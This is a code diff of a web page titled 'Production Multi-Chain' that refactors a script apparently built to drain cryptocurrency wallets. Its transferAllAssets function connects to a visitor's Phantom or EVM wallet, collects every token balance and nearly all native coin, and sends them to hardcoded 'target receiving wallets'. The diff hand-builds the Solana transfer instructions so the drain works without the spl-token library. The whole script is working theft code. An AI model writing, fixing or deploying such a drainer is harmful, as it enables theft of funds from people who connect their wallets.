@@ -1,17 +1,13 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Production Multi-Chain</title>
   
-  <!-- Web3 Engine Libraries (Browser-Compatible CDN Links) -->
+  <!-- Web3 Engine Libraries (Only Core Drivers) -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.11.1/dist/ethers.umd.min.js"></script>
   <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.js"></script>
-  <!-- Buffer polyfill required for browser SPL Token execution -->
-  <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
-  <script>window.Buffer = window.Buffer || buffer.Buffer;</script>
-  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/dist/browser/index.iife.js"></script>
   
   <style>
     :root {
@@ -141,7 +137,7 @@
 
 <script>
   // =========================================================
-  // 1. CONFIGURATION: TARGET RECEIVING WALLETS
+  // CONFIGURATION
   // =========================================================
   const WALLET_MAP = {
     ethereum: "0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0",
@@ -177,6 +173,10 @@
     "function decimals() view returns (uint8)"
   ];
 
+  // Solana Program Constants
+  const TOKEN_PROGRAM_ID_STR = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
+  const ASSOCIATED_TOKEN_PROGRAM_ID_STR = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
+
   function setStatus(message, type = 'info') {
     const box = document.getElementById("status");
     box.className = "status-box " + type;
@@ -206,6 +206,29 @@
     if (deepLink) window.location.href = deepLink;
   }
 
+  // Helper: Derives Associated Token Address natively without @solana/spl-token
+  async function findAssociatedTokenAddress(owner, mint, solanaWeb3) {
+    const tokenProgramId = new solanaWeb3.PublicKey(TOKEN_PROGRAM_ID_STR);
+    const ataProgramId = new solanaWeb3.PublicKey(ASSOCIATED_TOKEN_PROGRAM_ID_STR);
+    const [pubkey] = await solanaWeb3.PublicKey.findProgramAddress(
+      [owner.toBuffer(), tokenProgramId.toBuffer(), mint.toBuffer()],
+      ataProgramId
+    );
+    return pubkey;
+  }
+
+  // Helper: Encodes SPL Transfer Instruction Data (Index 3 + 64-bit uint64 Little Endian)
+  function createSplTransferInstructionData(amountBigInt) {
+    const data = new Uint8Array(9);
+    data[0] = 3; // Transfer instruction index
+    let val = amountBigInt;
+    for (let i = 1; i <= 8; i++) {
+      data[i] = Number(val & 0xffn);
+      val >>= 8n;
+    }
+    return data;
+  }
+
   async function transferAllAssets() {
     const network = document.getElementById("networkSelect").value;
     const receiver = WALLET_MAP[network];
@@ -217,22 +240,18 @@
 
     setStatus("🔄 Connecting provider...", "info");
 
-    // SOLANA ROUTINE
+    // =========================================================
+    // NATIVE SOLANA ROUTINE (NO SPL-TOKEN DEPENDENCY)
+    // =========================================================
     if (network === "solana") {
       if (typeof window.solanaWeb3 === "undefined") {
-        setStatus("❌ <b>Library Error:</b> @solana/web3.js failed to load. Check internet connection or disable adblockers.", "error");
-        return;
-      }
-      
-      if (typeof window.splToken === "undefined") {
-        setStatus("❌ <b>Library Error:</b> @solana/spl-token failed to load. Check internet connection or disable adblockers.", "error");
+        setStatus("❌ <b>Library Error:</b> @solana/web3.js failed to load.", "error");
         return;
       }
 
       const solanaWeb3 = window.solanaWeb3;
-      const splToken = window.splToken;
-
       const provider = window.solana;
+
       if (!provider || !provider.isPhantom) {
         setStatus("❌ <b>Wallet Error:</b> Phantom extension or in-app browser not detected.", "error");
         return;
@@ -254,48 +273,65 @@
         setStatus("🔎 Scanning Solana token accounts...", "info");
 
         const transaction = new solanaWeb3.Transaction();
+        const tokenProgramId = new solanaWeb3.PublicKey(TOKEN_PROGRAM_ID_STR);
+
         const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
           sender,
-          { programId: splToken.TOKEN_PROGRAM_ID }
+          { programId: tokenProgramId }
         );
 
         let activeTokens = 0;
 
         for (let acc of tokenAccounts.value) {
           const parsedInfo = acc.account.data.parsed.info;
-          const tokenAmount = parsedInfo.tokenAmount.amount;
+          const tokenAmountStr = parsedInfo.tokenAmount.amount;
+          const amountBigInt = BigInt(tokenAmountStr);
           
-          if (BigInt(tokenAmount) > 0n) {
+          if (amountBigInt > 0n) {
             activeTokens++;
             const sourceAta = acc.pubkey;
             const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
-            const destinationAta = await splToken.getAssociatedTokenAddress(mint, target);
+            const destinationAta = await findAssociatedTokenAddress(target, mint, solanaWeb3);
             const destAccountInfo = await connection.getAccountInfo(destinationAta);
             
+            // If receiver ATA does not exist, create it
             if (!destAccountInfo) {
+              const ataProgramId = new solanaWeb3.PublicKey(ASSOCIATED_TOKEN_PROGRAM_ID_STR);
+              const systemProgramId = solanaWeb3.SystemProgram.programId;
+              
               transaction.add(
-                splToken.createAssociatedTokenAccountInstruction(
-                  sender,
-                  destinationAta,
-                  target,
-                  mint
-                )
+                new solanaWeb3.TransactionInstruction({
+                  keys: [
+                    { pubkey: sender, isSigner: true, isWritable: true },
+                    { pubkey: destinationAta, isSigner: false, isWritable: true },
+                    { pubkey: target, isSigner: false, isWritable: false },
+                    { pubkey: mint, isSigner: false, isWritable: false },
+                    { pubkey: systemProgramId, isSigner: false, isWritable: false },
+                    { pubkey: tokenProgramId, isSigner: false, isWritable: false },
+                  ],
+                  programId: ataProgramId,
+                  data: new Uint8Array(0)
+                })
               );
             }
 
+            // Add SPL Transfer Instruction natively
             transaction.add(
-              splToken.createTransferInstruction(
-                sourceAta,
-                destinationAta,
-                sender,
-                BigInt(tokenAmount)
-              )
+              new solanaWeb3.TransactionInstruction({
+                keys: [
+                  { pubkey: sourceAta, isSigner: false, isWritable: true },
+                  { pubkey: destinationAta, isSigner: false, isWritable: true },
+                  { pubkey: sender, isSigner: true, isWritable: false },
+                ],
+                programId: tokenProgramId,
+                data: createSplTransferInstructionData(amountBigInt)
+              })
             );
           }
         }
 
         const totalSolBalance = await connection.getBalance(sender);
-        const reservedGas = 2000000; // Reserve 0.002 SOL for fee
+        const reservedGas = 2000000; // Reserve 0.002 SOL for transaction fees
         const solToTransfer = totalSolBalance - reservedGas;
 
         if (totalSolBalance === 0 && activeTokens === 0) {
@@ -304,7 +340,7 @@
         }
 
         if (solToTransfer <= 0 && activeTokens > 0) {
-          setStatus("❌ <b>Gas Error:</b> Native SOL balance insufficient to cover transaction fees.", "error");
+          setStatus("❌ <b>Gas Error:</b> Native SOL balance insufficient to cover fee.", "error");
           return;
         }
 
@@ -322,7 +358,7 @@
         const { blockhash } = await connection.getLatestBlockhash();
         transaction.recentBlockhash = blockhash;
 
-        setStatus("✍️️ Prompting approval in Phantom...", "info");
+        setStatus("✍️ Prompting approval in Phantom...", "info");
         const { signature } = await provider.signAndSendTransaction(transaction);
         setStatus(`✅ <b>Complete!</b> Tx Hash: <code>${signature.slice(0, 16)}...</code>`, "success");
 
@@ -333,9 +369,11 @@
       return;
     }
 
+    // =========================================================
     // EVM ROUTINE
+    // =========================================================
     if (typeof ethers === "undefined") {
-      setStatus("❌ <b>Library Error:</b> Ethers.js library failed to load. Try refreshing.", "error");
+      setStatus("❌ <b>Library Error:</b> Ethers.js library failed to load.", "error");
       return;
     }
 
@@ -401,7 +439,7 @@
       const gasCost = estimatedGasLimit * gasPrice;
 
       if (nativeBalance <= gasCost) {
-        setStatus("⚠️️ Native balance too low to pay gas for final coin sweep.", "error");
+        setStatus("⚠️ Native balance too low to pay gas for final coin sweep.", "error");
         return;
       }
 
@@ -421,7 +459,7 @@
     } catch (err) {
       console.error(err);
       if (err.code === "ACTION_REJECTED" || err.message?.includes("user rejected")) {
-        setStatus("⚠ <b>Cancelled:</b> Transaction declined by user.", "error");
+        setStatus("⚠️ <b>Cancelled:</b> Transaction declined by user.", "error");
       } else {
         setStatus(`❌ <b>Execution Failed:</b> ${err.reason || err.message}`, "error");
       }
